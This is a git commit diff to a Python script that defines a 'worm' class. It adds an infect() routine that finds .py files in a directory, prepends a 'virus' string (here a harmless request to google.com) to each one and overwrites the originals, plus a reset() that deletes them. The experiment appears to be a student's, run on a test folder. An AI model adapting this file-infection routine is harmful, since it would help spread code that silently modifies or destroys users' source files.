0280231fc322a29a5eaa81edd092a30b2e410156
Drew Emery <abemery@clemson.edu>
2019-04-25 22:09:38 -0400

    open files -> create intermediary infected file -> replace old python file with new python file

--- main.py
+++ main.py
@@ -6,31 +6,54 @@ class worm():
     def __init__(self):
 
         # list of directories
-        self.dirs = []
+        self.files = []
+        self.temp = []
         # list of paths
         self.paths = []
 
+        # the virus that we are inserting into
+        self.virus = 'import requests\nr = requests.get(\'https://www.google.com\')\n'
+
         # the initial path that we are searching along
-        self.path = '/Library/Python/3.7/lib/python/site-packages'
+        self.path = '/Users/Drew/Projects/garbage'
 
         for root, directories, files in os.walk(self.path):
-            self.dirs.append(directories)
+            self.temp.append(files)
 
-        # we only want the first element
-        self.dirs = self.dirs[0]
+        # if we found at least one file, print it
+        if len(self.temp) > 0:
+            # we only want the first element
+            self.temp = self.temp[0]
 
         # find every python file that is not a cache file
-        for dir in self.dirs:
-            for root, directories, files in os.walk('/'.join([self.path,dir])):
-                for file in files:
-                    # filters out the cache file
-                    if '.py' in file and '.pyc' not in file:
-                        self.paths.append('/'.join([self.path,dir,file]))
+        for file in self.temp:
+            # filters out the cache file
+            if '.py' in file and '.pyc' not in file:
+                self.files.append('/'.join([self.path,file]))
+
+    def infect(self):
+        # infect every python file we found
+        for file in self.files:
+            # only open the files as read
+            with open(file, 'r')as r:
+                # construct the name of the infected file
+                newName = (str(file) + '.infected')
+                # create the new, infected file
+                with open(newName, 'a') as w:
+                    w.write(self.virus)
+                    for line in r.readlines():
+                        w.write(line)
+            # remove the old file
+            os.remove(file)
+            # rename the infected file to the old file name
+            os.rename(newName, file)
+
+    def reset(self):
+        for file in self.files:
+            os.remove(file)
 
 if __name__ =='__main__':
     # make a worm instance
     worm = worm()
-
-    for path in worm.paths:
-        with open(path, 'r') as file:
-            print(file)
+    worm.infect()
+    # worm.reset()
